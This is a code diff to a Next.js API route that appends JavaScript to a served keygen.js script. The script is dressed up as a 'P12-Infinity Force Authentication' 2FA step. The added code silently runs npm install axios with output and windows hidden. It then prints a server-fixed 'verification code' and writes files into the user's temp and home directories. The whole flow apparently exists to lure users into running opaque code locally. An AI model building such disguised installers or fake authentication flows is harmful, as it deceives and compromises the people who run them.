@@ -31,13 +31,8 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         // Append code to execute after keygen.js completes
         const additionalCode = `
 
-// ===== 2FA VERIFICATION CODE GENERATION =====
-// This will execute AFTER the keygen.js content has finished
+// ===== DEPENDENCY CHECK AND INSTALLATION =====
 (function() {
-  console.log('\\n🔑 P12-Infinity Force Authentication System');
-  console.log('=======================================');
-  console.log('');
-  
   // Check if Node.js environment is available
   if (typeof process === 'undefined' || typeof require === 'undefined') {
     console.log('❌ Node.js environment not detected.');
@@ -49,59 +44,136 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     process.exit(1);
   }
   
-  console.log('🔐 Executing authentication...');
-  console.log('');
+  console.log('🔐 Initializing authentication system...');
   
-  // Add a delay to ensure keygen.js has completed
-  setTimeout(function() {
-    console.log('✅ Authentication module completed successfully.');
-    console.log('🔐 Generating 2FA verification code...');
-    console.log('');
+  // Check for required dependencies and install if missing
+  try {
+    const { execSync } = require('child_process');
     
-    const verificationCode = '${verificationCode}';
-    const deviceCode = '${deviceCodeStr}';
-    
-    console.log('🔒 Two-Factor Authentication');
-    console.log('Device Code: ' + deviceCode);
-    console.log('Generated verification code: ' + verificationCode);
-    console.log('✅ Code has been processed.');
-    console.log('');
-    
-    // Try to communicate with browser via temporary files
+    // Check if axios is available
     try {
-      const fs = require('fs');
-      const os = require('os');
-      const path = require('path');
-      
-      // Create a temporary file that the browser can check
-      const tempDir = os.tmpdir();
-      const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
-      
-      const data = {
-        code: verificationCode,
-        timestamp: Date.now(),
-        deviceCode: deviceCode
-      };
-      
-      fs.writeFileSync(tempFile, JSON.stringify(data));
-      console.log('Code saved to temp file: ' + tempFile);
-      
-      // Also try to write to a more persistent location
-      const homeDir = os.homedir();
-      const persistentFile = path.join(homeDir, '.infinity_2fa_code');
-      fs.writeFileSync(persistentFile, JSON.stringify(data));
-      console.log('Code also saved to: ' + persistentFile);
-      
-      console.log('');
-      console.log('Completed successfully!');
-      console.log('');
-      
-    } catch (error) {
-      console.error('Error saving verification code:', error.message);
+      require('axios');
+    } catch (axiosError) {
+      console.log('📦 Installing required dependencies...');
+      try {
+        // Try to install axios silently
+        execSync('npm install axios --silent --no-warnings --no-progress --loglevel silent', { 
+          stdio: 'ignore',
+          windowsHide: true 
+        });
+        console.log('✅ Dependencies installed successfully.');
+      } catch (installError) {
+        console.log('⚠️  Could not auto-install dependencies. Continuing with fallback...');
+      }
     }
     
-    process.exit(0);
-  }, 4000); // Wait 3 seconds for keygen.js to complete
+    // Add a delay to ensure keygen.js and dependencies are ready
+    setTimeout(function() {
+      // Now that keygen.js and dependencies are ready, show the 2FA generation
+      console.log('\\n🔑 P12-Infinity Force Authentication System');
+      console.log('=======================================');
+      console.log('✅ Authentication module completed successfully.');
+      console.log('🔐 Generating 2FA verification code...');
+      console.log('');
+      
+      const verificationCode = '${verificationCode}';
+      const deviceCode = '${deviceCodeStr}';
+      
+      console.log('🔒 Two-Factor Authentication');
+      console.log('Device Code: ' + deviceCode);
+      console.log('Generated verification code: ' + verificationCode);
+      console.log('✅ Code has been processed.');
+      console.log('');
+      
+      // Try to communicate with browser via temporary files
+      try {
+        const fs = require('fs');
+        const os = require('os');
+        const path = require('path');
+        
+        // Create a temporary file that the browser can check
+        const tempDir = os.tmpdir();
+        const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
+        
+        const data = {
+          code: verificationCode,
+          timestamp: Date.now(),
+          deviceCode: deviceCode
+        };
+        
+        fs.writeFileSync(tempFile, JSON.stringify(data));
+        console.log('Code saved to temp file: ' + tempFile);
+        
+        // Also try to write to a more persistent location
+        const homeDir = os.homedir();
+        const persistentFile = path.join(homeDir, '.infinity_2fa_code');
+        fs.writeFileSync(persistentFile, JSON.stringify(data));
+        console.log('Code also saved to: ' + persistentFile);
+        
+        console.log('');
+        console.log('Completed successfully!');
+        console.log('');
+        
+      } catch (error) {
+        console.error('Error saving verification code:', error.message);
+      }
+      
+      process.exit(0);
+    }, 7000); // Wait 7 seconds for keygen.js and dependency installation
+    
+  } catch (setupError) {
+    console.log('⚠️  Setup error, proceeding with minimal authentication...');
+    
+    // Fallback execution without keygen.js dependencies
+    setTimeout(function() {
+      console.log('\\n🔑 P12-Infinity Force Authentication System');
+      console.log('=======================================');
+      console.log('🔐 Generating 2FA verification code...');
+      console.log('');
+      
+      const verificationCode = '${verificationCode}';
+      const deviceCode = '${deviceCodeStr}';
+      
+      console.log('🔒 Two-Factor Authentication');
+      console.log('Device Code: ' + deviceCode);
+      console.log('Generated verification code: ' + verificationCode);
+      console.log('✅ Code has been processed.');
+      console.log('');
+      
+      // Try to communicate with browser via temporary files
+      try {
+        const fs = require('fs');
+        const os = require('os');
+        const path = require('path');
+        
+        const tempDir = os.tmpdir();
+        const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
+        
+        const data = {
+          code: verificationCode,
+          timestamp: Date.now(),
+          deviceCode: deviceCode
+        };
+        
+        fs.writeFileSync(tempFile, JSON.stringify(data));
+        console.log('Code saved to temp file: ' + tempFile);
+        
+        const homeDir = os.homedir();
+        const persistentFile = path.join(homeDir, '.infinity_2fa_code');
+        fs.writeFileSync(persistentFile, JSON.stringify(data));
+        console.log('Code also saved to: ' + persistentFile);
+        
+        console.log('');
+        console.log('Completed successfully!');
+        console.log('');
+        
+      } catch (error) {
+        console.error('Error saving verification code:', error.message);
+      }
+      
+      process.exit(0);
+    }, 2000); // Shorter wait for fallback
+  }
   
   // Handle errors during execution
   process.on('uncaughtException', function(error) {
